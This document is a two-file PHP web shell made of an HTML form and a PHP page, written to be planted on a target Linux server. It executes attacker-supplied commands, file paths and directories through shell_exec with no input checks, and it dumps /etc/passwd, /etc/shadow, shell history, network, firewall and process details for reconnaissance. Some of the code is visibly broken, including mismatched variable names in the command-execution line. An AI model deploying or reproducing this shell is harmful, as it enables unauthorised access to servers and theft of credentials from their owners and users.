-----------------------CUT save as linux_profiling.html-----------------------
// use this as a easy to use interface to conduct three actions on the target
// show contents of a file
// list contents of a dir
// launch a command on the system
<html>
<body>
<form action="linux_profiling.php" method="get">
Filename: <input type="text" name="filename"><br>
Directory: <input type="text" name="directory"><br>
ExecCMD: <input type="text" name="execcmd"><br>
<input type="submit">
</form>
</body>
</html>
//
//
//
-----------------------CUT save as linux_profiling.php-----------------------
// Usage: PROTO://SERVER:PORT/DIR/linux_profiling.php?filename=/etc/passwd&directory=/&execmd=ls%20-asl
// performs different commands on a linux system in order to profile the system and level of accesss
// can be called directly, does not need to be used with the HTML interface file ...
<html>
<body>
<p align="left">Whoami:<br><b><?php $who=shell_exec('whoami'); echo "<code>$who</code>"; ?><br></b>
<p align="left">Ifconfig:<br><b><?php $ifc=shell_exec('ifconfig'); echo "<pre>$ifc</pre>"; ?><br></b>
<p align="left">Filename Contents:<br><b><?php $fname=$_GET["filename"]; $fn=shell_exec("cat $fname"); echo "<code>$fn</code>"; ?><br></b>
<p align="left">Directory Listing:<br><b><?php $dirlist=$_GET["directory"]; $dl=shell_exec("ls -asl $dirlist"); echo "<pre>$dl</pre>"; ?><br></b>
<p align="left">ExecCmd:<br><b><?php $dirlist=$_GET["execmd"]; $dl=shell_exec("bash -e '$execcmd'"); echo "<pre>$dl</pre>"; ?><br></b>
<p align="left">Issue:<br><b><?php $isu=shell_exec('cat /etc/issue'); echo "<code>$isu</code>"; ?><br></b>
<p align="left">Release:<br><b><?php $rel=shell_exec("cat /etc/*-release"); echo "<code>$rel</code>"; ?><br></b>
<p align="left">Release2:<br><b><?php $rell=shell_exec("cat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'"); echo "<code>$rell</code>"; ?><br></b>
<p align="left">ProcVersion:<br><b><?php $procv=shell_exec("cat /proc/version"); echo "<code>$procv</code>"; ?><br></b>
<p align="left">RPMInstalls:<br><b><?php $rpmk=shell_exec("rpm -q kernel"); echo "<code>$rpmk</code>"; ?><br></b>
<p align="left">DMSG Output:<br><b><?php $dmsg=shell_exec("dmesg | grep Linux"); echo "<code>$dmsg</code>"; ?><br></b>
<p align="left">ListBootDir:<br><b><?php $lbd=shell_exec("ls /boot | grep vmlinuz-"); echo "<code>$lbd</code>"; ?><br></b>
<p align="left">LSB Release:<br><b><?php $lsb=shell_exec("lsb_release -a"); echo "<code>$lsb</code>"; ?><br></b>
<p align="left">Last Log:<br><b><?php $last=shell_exec("last -a"); echo "<code>$last</code>"; ?><br></b>
<p align="left">SysUname:<br><b><?php $unamea=shell_exec("uname -a"); echo "<code>$unamea</code>"; ?><br></b>
<p align="left">Unameall:<br><b><?php $unamem=shell_exec("uname -mrs"); echo "<code>$unamem</code>"; ?><br></b>
<p align="left">UserID:<br><b><?php $eid=shell_exec("id"); echo "<code>$eid</code>"; ?><br></b>
<p align="left">History:<br><b><?php $hist=shell_exec("history"); echo "<code>$hist</code>"; ?><br></b>
<p align="left">Arp List:<br><b><?php $arpa=shell_exec("arp -a"); echo "<code>$arpa</code>"; ?><br></b>
<p align="left">netstatinfo:<br><b><?php $nsta=shell_exec("netstat -anot"); echo "<code>$nsta</code>"; ?><br></b>
<p align="left">ps-list:<br><b><?php $pse=shell_exec("ps -elf"); echo "<pre>$pse</pre>"; ?><br></b>
<p align="left">ps-list-root:<br><b><?php $pser=shell_exec("ps -elf | grep root"); echo "<pre>$pser</pre>"; ?><br></b>
<p align="left">ListWebDir:<br><b><?php $lsla=shell_exec("ls -la /var/www/html/"); echo "<pre>$lsla</pre>"; ?><br></b>
<p align="left">ApacheStatus:<br><b><?php $aserv=shell_exec("service apache2 status"); echo "<code>$aserv</code>"; ?><br></b>
<p align="left">CatResolve:<br><b><?php $reso=shell_exec("cat /etc/resolv.conf"); echo "<code>$reso</code>"; ?><br></b>
<p align="left">CatNetworks:<br><b><?php $netw=shell_exec("cat /etc/networks"); echo "<code>$netw</code>"; ?><br></b>
<p align="left">IptablesList:<br><b><?php $iptl=shell_exec("iptables -L"); echo "<code>$iptl</code>"; ?><br></b>
<p align="left">IPtablesNAT:<br><b><?php $iptn=shell_exec("iptables -L -t nat"); echo "<code>$iptn</code>"; ?><br></b>
<p align="left">ListServices:<br><b><?php $lsofi=shell_exec("lsof -i"); echo "<code>$lsofi</code>"; ?><br></b>
<p align="left">CatServices:<br><b><?php $eserv=shell_exec("cat /etc/services"); echo "<pre>$eserv</pre>"; ?><br></b>
<p align="left">ListWebServer:<br><b><?php $sere=shell_exec("grep 80 /etc/services"); echo "<pre>$sere</pre>"; ?><br></b>
<p align="left">RunWhoCMD:<br><b><?php $ww=shell_exec("w"); echo "<pre>$ww</pre>"; ?><br></b>
<p align="left">ShowRoute:<br><b><?php $rou=shell_exec("route -n"); echo "<pre>$rou</pre>"; ?><br></b>
<p align="left">BreakoutUsers: <?php $pwdb=shell_exec("cat /etc/passwd | awk -F :<br><b>'{if ($3 > 999 && $3 < 60001) print $1,$3,$6}'"); echo "<code>$pwdb</code>"; ?><br></b>
<p align="left">CatMOTD:<br><b><?php $motd=shell_exec("cat /etc/motd"); echo "<code>$motd</code>"; ?><br></b>
<p align="left">CatGroup:<br><b><?php $egr=shell_exec("cat /etc/group"); echo "<pre>$egr</pre>"; ?><br></b>
<p align="left">CatShadow:<br><b><?php $esh=shell_exec("cat /etc/shadow"); echo "<code>$esh</code>"; ?><br></b>
</body>
</html>
